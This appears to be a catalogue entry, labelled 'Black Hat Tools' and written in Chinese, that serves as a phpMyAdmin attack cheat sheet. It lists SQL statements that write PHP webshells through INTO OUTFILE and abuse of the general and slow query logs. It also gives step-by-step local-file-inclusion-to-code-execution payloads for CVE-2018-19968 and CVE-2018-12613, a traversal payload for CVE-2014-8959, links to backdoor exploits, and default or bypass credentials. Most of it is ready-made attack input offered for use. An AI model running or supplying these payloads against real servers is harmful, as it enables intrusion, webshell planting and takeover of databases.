---
title: "https://www.exploit-db.com/exploits/25136"
description: "
phpMyAdmin

寫文件 getshell

條件

root 權限
已知 web 路徑
有寫檔權限


select \"<?php phpinfo();?>\" INTO OUTFILE  \"c:\\phpstudy\\www\\shell.php\"


general_log getshell

條件

讀寫權限
已知 web 路徑


step1. 開啟日誌: set global general_log = \"ON\";
step2. 指定日誌文件: set global general_log_file = \"/var/www/html/shell.php\";
step3. 寫入php: select \"<?php phpinfo();?>\";


slow_query getshell

step1. 設置日誌路徑: set GLOBAL slow_query_log_file='/var/www/html/shell.php';
step2. 開啟 slow_query_log: set GLOBAL slow_query_log=on;
step3. 寫入 php: select '<?php phpinfo();?>' from mysql.db where sleep(10);


CVE-2018-19968

phpMyAdmin versions: 4.8.0 ~ 4.8.3
LFI to RCE
條件

能登入後台


step1. CREATE DATABASE foo;CREATE TABLE foo.bar (baz VARCHAR(100) PRIMARY KEY );INSERT INTO foo.bar SELECT '<?php phpinfo(); ?>';
step2. /chk_rel.php?fixall_pmadb=1&db=foo
step3. INSERT INTO` pma__column_infoSELECT '1', 'foo', 'bar', 'baz', 'plop','plop', ' plop', 'plop','../../../../../../../../tmp/sess_{SESSIONID}','plop';
step4. /tbl_replace.php?db=foo&table=bar&where_clause=1=1&fields_name[multi_edit][][]=baz&clause_is_unique=1


CVE-2018-12613

phpMyAdmin versions: 4.8.x
LFI to RCE
條件

能登入後台


Payload

index.php?target=db_sql.php%253f/../../../../../../windows/system.ini
index.php?target=sql.php%253f/../../../tmp/tmp/sess_16rme70p2qqnqjnhdiq3i6unu

在控制台執行的 sql 語句會被寫入 session
Session id 可以從 cookie phpMyAdmin 得到






CVE-2016-5734

phpmyadmin versions:

4.0.10.16 之前的4.0.x版本
4.4.15.7 之前的 4.4.x版本
4.6.3之前的 4.6.x版本


php version:

4.3.0 ~ 5.4.6


preg_replace RCE
條件

能登入後台




CVE-2014-8959

phpMyAdmin version:

4.0.1 ~ 4.2.12


php version:

< 5.3.4


條件

能登入後台
能截斷


Payload: gis_data_editor.php?token=2941949d3768c57b4342d94ace606e91&gis_data[gis_type]=/../../../../phpinfo.txt%00 (需修改token)


CVE-2013-3238

versions: 3.5.x < 3.5.8.1 and 4.0.0 < 4.0.0-rc3 ANYUN.ORG



CVE-2012-5159

versions: v3.5.2.2
server_sync.php Backdoor
https://www.exploit-db.com/exploits/21834


CVE-2009-1151

versions: 2.11.x < 2.11.9.5 and 3.x < 3.1.3.1
config/config.inc.php 命令執行
https://www.exploit-db.com/exploits/8921


弱密碼 / 萬用密碼

phpmyadmin 2.11.9.2: root/空密碼
phpmyadmin 2.11.3 / 2.11.4: 用戶名: 'localhost'@'@\"



"
external_url: "https://www.exploit-db.com/exploits/25136"
category: "Black Hat Tools"
---
